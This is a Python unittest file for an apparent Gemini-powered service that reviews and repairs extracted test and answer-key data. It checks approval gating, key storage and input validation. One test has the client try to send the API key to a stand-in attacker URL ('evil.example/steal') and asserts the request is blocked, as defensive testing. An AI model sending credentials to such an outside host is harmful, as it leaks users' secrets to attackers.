import copy
import json
import os
import threading
import unittest
from unittest.mock import patch
import test_converter as fixtures
from converter.gemini import AIService, KeySettings, GeminiClient, candidate_review, evidence_errors, load_documents
from converter.store import digest

DOCUMENTS=[dict(index=1,role='test',pages=1,name='test.pdf',bytes=b'%PDF-test'),dict(index=2,role='key',pages=1,name='key.pdf',bytes=b'%PDF-key')]

class GeminiTests(unittest.TestCase):
    setUp=fixtures.StoreTests.setUp
    tearDown=fixtures.StoreTests.tearDown
    source=fixtures.StoreTests.source
    prepared=fixtures.StoreTests.prepared
    def response(self,r):
        return dict(metadataJson=json.dumps(r['metadata']),fields=copy.deepcopy(r['fields']),resolutions=[dict(id='check',note='Verified against test page 1 and key page 1.')],evidence=[dict(questionId='1',testPage=1,keyPage=1,reason='The key explicitly selects A for this two-point item.')],unresolved=[],summary='Repaired the extracted choice and checked the score.')
    def verification(self):return dict(ready=True,issues=[],questionCount=1,maxScore=2,sourceComplete=True,rubricComplete=True,scoresSupported=True,coverage=[dict(document=1,page=1,note='Verified the entire question.'),dict(document=2,page=1,note='Verified answer A and two points.')])
    def service(self,r,verify=None,after=None):
        result=self.response(r);check=verify or self.verification()
        class FakeClient:
            def __init__(self,*args):self.calls=0;self.usage=[]
            def parts(self,documents):return []
            def generate(self,*args):
                self.calls+=1;self.usage.append({'totalTokenCount':100})
                if self.calls==2 and after:after()
                return copy.deepcopy(result if self.calls==1 else check)
            def cleanup(self):return 0
        service=AIService(self.store,threading.Event(),FakeClient);service.keys.save(dict(key='fake_local_test_key_1234567890',model='gemini-3.5-flash-lite',remember=False));return service
    def execute(self,service,id):
        with patch('converter.gemini.load_documents',return_value=DOCUMENTS):
            service.enqueue([id],True,True)
            run=service.snapshot()['runs'][0]
            service.update(run['id'],'running','Test fixture running')
            service.run_one(run)
        return service.snapshot()['runs'][0]
    def test_ai_repairs_approves_exports_and_keeps_backup(self):
        id,r=self.prepared();r['fields'][0]['answer']='B';self.store.save_review(id,r)
        correct=copy.deepcopy(r);correct['fields'][0]['answer']='A';service=self.service(correct)
        result=self.execute(service,id);self.assertEqual(result['status'],'exported')
        detail=self.store.detail(id);self.assertEqual(detail['review']['fields'][0]['answer'],'A');self.assertIn('Gemini AI review',detail['review']['reviewer']);self.assertTrue(detail['review']['aiReview']['verified'])
        backup=self.store.home/'jobs'/id/'ai'/(result['id']+'-before.json');self.assertEqual(json.loads(backup.read_text())['fields'][0]['answer'],'B')
    def test_uncertainty_never_auto_approves(self):
        id,r=self.prepared();check=self.verification();check['ready']=False;check['issues']=['Rubric is ambiguous.'];service=self.service(r,check);before=digest(r)
        result=self.execute(service,id);self.assertEqual(result['status'],'needs_review');self.assertEqual(digest(self.store.detail(id)['review']),before);self.assertEqual(self.store.get(id)['status'],'needs_review')
    def test_missing_page_coverage_blocks(self):
        id,r=self.prepared();check=self.verification();check['coverage']=check['coverage'][:1];service=self.service(r,check)
        self.assertEqual(self.execute(service,id)['status'],'needs_review')
    def test_score_disagreement_blocks(self):
        id,r=self.prepared();check=self.verification();check['maxScore']=5;service=self.service(r,check)
        self.assertEqual(self.execute(service,id)['status'],'needs_review')
    def test_manual_edits_during_request_are_preserved(self):
        id,r=self.prepared()
        def change():
            updated=copy.deepcopy(r);updated['reviewNotes']='Manual edit while request ran';self.store.save_review(id,updated)
        service=self.service(r,after=change)
        with self.assertRaisesRegex(ValueError,'changed while AI'):self.execute(service,id)
        self.assertEqual(self.store.detail(id)['review']['reviewNotes'],'Manual edit while request ran')
    def test_cancelled_request_does_not_apply(self):
        id,r=self.prepared();service=self.service(r);service.client_factory=self.service(r,after=service.cancel.set).client_factory
        with self.assertRaisesRegex(ValueError,'cancelled'):self.execute(service,id)
        self.assertEqual(digest(self.store.detail(id)['review']),digest(r))
    def test_repeat_submission_cannot_queue_active_repair_twice(self):
        id,r=self.prepared();service=self.service(r)
        with patch('converter.gemini.load_documents',return_value=DOCUMENTS):
            first=service.enqueue([id]);second=service.enqueue([id])
            self.assertEqual(first['added'],[id]);self.assertEqual(second['added'],[])
            run=service.snapshot()['runs'][0];service.update(run['id'],'running','Repairing')
            self.assertEqual(service.enqueue([id])['added'],[])
        self.assertEqual(len(service.snapshot()['runs']),1)

    def test_restart_does_not_repeat_paid_requests(self):
        id,r=self.prepared();service=self.service(r)
        with patch('converter.gemini.load_documents',return_value=DOCUMENTS):service.enqueue([id])
        restarted=AIService(self.store,threading.Event());self.assertEqual(restarted.snapshot()['runs'][0]['status'],'interrupted')
    def test_opaque_key_format_and_quoted_paste(self):
        settings=KeySettings(self.store)
        key='AQ.fake-format-test/with+punctuation=='
        settings.save(dict(key=' "'+key+'" '))
        self.assertEqual(settings.key,key)
        self.assertNotIn(key,json.dumps(settings.public()))
    def test_malformed_key_does_not_replace_saved_key(self):
        settings=KeySettings(self.store);original='fake_original_key_1234567890'
        settings.save(dict(key=original))
        for value in ['short','fake_key_with_internal space_12345','fake_key_with_newline\n1234567890','GEMINI_API_KEY='+original]:
            with self.assertRaises(ValueError):settings.save(dict(key=value))
            self.assertEqual(settings.key,original)
    def test_key_is_session_only_and_never_returned(self):
        key='fake_local_test_key_1234567890';settings=KeySettings(self.store);settings.save(dict(key=key,remember=False));self.assertNotIn(key,json.dumps(settings.public()));self.assertFalse(settings.file.exists());self.assertFalse(KeySettings(self.store).key)
    @unittest.skipUnless(os.name=='nt','Windows encryption only')
    def test_saved_key_is_encrypted_and_forget_removes_it(self):
        key='fake_local_test_key_1234567890';settings=KeySettings(self.store);settings.save(dict(key=key,remember=True));self.assertNotIn(key.encode(),settings.file.read_bytes());self.assertEqual(KeySettings(self.store).key,key);settings.clear();self.assertFalse(settings.file.exists())
    def test_missing_key_pdf_blocks_before_paid_request(self):
        id,r=self.prepared();detail=self.store.detail(id);detail['source']['assets'][1]['path']=None
        with self.assertRaises(ValueError):load_documents(self.store,detail)
    def test_key_cannot_be_sent_to_other_host(self):
        client=GeminiClient('fake_key','gemini-3.5-flash-lite',threading.Event())
        with self.assertRaisesRegex(ValueError,'destination'):client.request('https://evil.example/steal')
    def test_model_cannot_change_source_identity(self):
        id,r=self.prepared();result=self.response(r);m=r['metadata'].copy();m['sourceUrl']='https://evil.example';m['division']='B';m['topicMatch']='current';result['metadataJson']=json.dumps(m)
        candidate=candidate_review(self.store.detail(id),result,'gemini-3.5-flash-lite');self.assertEqual(candidate['metadata']['sourceUrl'],r['metadata']['sourceUrl']);self.assertEqual(candidate['metadata']['division'],'C');self.assertEqual(candidate['metadata']['topicMatch'],'unverified')

if __name__=='__main__':unittest.main()
